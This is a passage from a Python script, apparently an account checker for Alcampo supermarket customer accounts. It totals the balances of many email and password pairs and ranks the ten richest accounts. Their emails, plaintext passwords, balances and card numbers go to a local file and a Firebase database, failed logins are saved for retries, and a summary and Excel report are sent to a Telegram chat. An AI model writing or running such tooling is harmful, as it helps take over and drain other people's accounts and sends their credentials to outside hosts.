        saldo_total += valor
        if valor > 0:
            cuentas_con_saldo += 1
            cuentas_ranked.append((valor, r["email"], r.get("password", "")))
        elif valor == 0:
            cuentas_saldo_cero += 1

    # Sort by balance descending and take top 10
    cuentas_ranked.sort(key=lambda x: x[0], reverse=True)
    top_10 = cuentas_ranked[:10]
    
    top_10_text = "\n".join(
        f"   {i+1}. {html.escape(email)} ({val:.2f} €)"
        for i, (val, email, _) in enumerate(top_10)
    ) if top_10 else "   N/A"
            
    mensaje_resumen = (
        f"📊 <b>RESUMEN ALCAMPO OPTIMIZADO</b>\n\n"
        f"✅ Cuentas procesadas: {len(resultados)}\n"
        f"⏱️ Tiempo empleado: {duration/60:.2f} min\n"
        f"💰 <b>Saldo Total:</b> {saldo_total:.2f} €\n"
        f"💎 Cuentas con dinero: {cuentas_con_saldo}\n"
        f"💤 Cuentas con saldo 0: {cuentas_saldo_cero}\n"
        f"⚠️ Cuentas con error/sin saldo: {cuentas_error}\n\n"
        f"🏆 <b>Top 10 Cuentas:</b>\n{top_10_text}"
    )
    
    print("\n" + mensaje_resumen)
    
    # Push top 10 accounts locally and to Firebase for real-time dashboard display
    if top_10:
        try:
            card_map = {acc["email"]: acc.get("card_number") for acc in accounts if "email" in acc}
            top_accounts_data = [
                {"email": email, "password": pwd, "balance": val, "card_number": card_map.get(email)}
                for val, email, pwd in top_10
            ]
            # Always save locally
            try:
                top_local_path = ROOT.parent / "docs" / "top_accounts.json"
                # Ensure docs folder exists
                top_local_path.parent.mkdir(parents=True, exist_ok=True)
                with open(top_local_path, "w", encoding="utf-8") as f:
                    json.dump(top_accounts_data, f, indent=4)
                print(f"✔ top_accounts.json local guardado en {top_local_path}")
            except Exception as e:
                print(f"Error escribiendo top_accounts.json local: {e}")

            # Save to Firebase if configured
            firebase_url = get_firebase_url()
            if firebase_url:
                url = firebase_url.strip().rstrip('/') + "/top_accounts.json"
                requests.put(url, json=top_accounts_data, timeout=5)
                print(f"✔ top_accounts.json enviado a Firebase.")
        except Exception as e:
            print(f"Error al exportar Top 10 cuentas: {e}")
    
    # Export failed accounts for cycle retries / auto-healing
    failed_accounts = [
        {"email": r["email"], "password": r.get("password", "")}
        for r in resultados
        if ("Error" in str(r.get("saldo", "")) or "No encontrado" in str(r.get("saldo", "")))
    ]
    failed_path = ROOT / "failed_accounts.json"
    try:
        with open(failed_path, "w", encoding="utf-8") as f:
            json.dump(failed_accounts, f, indent=2)
        print(f"💾 {len(failed_accounts)} cuentas con error guardadas en: {failed_path}")
        
        firebase_url = get_firebase_url()
        if firebase_url:
            url = firebase_url.strip().rstrip('/') + "/failed_accounts.json"
            requests.put(url, json=failed_accounts, timeout=5)
    except Exception as e:
        print(f"Advertencia: No se pudo guardar failed_accounts.json: {e}")

    if send_telegram:
        enviar_telegram_texto(telegram_token, chat_id, mensaje_resumen)
        enviar_telegram_documento(
            telegram_token, 
            chat_id, 
            EXCEL_FILE, 
            caption="📊 Reporte de saldos de cuentas Alcampo"
        )
        print("🎉 Proceso completo y enviado a Telegram.")
    else:
        print("ℹ️ Envío a Telegram desactivado. Usa el script sin --no-telegram para activarlo.")


if __name__ == "__main__":
    main()
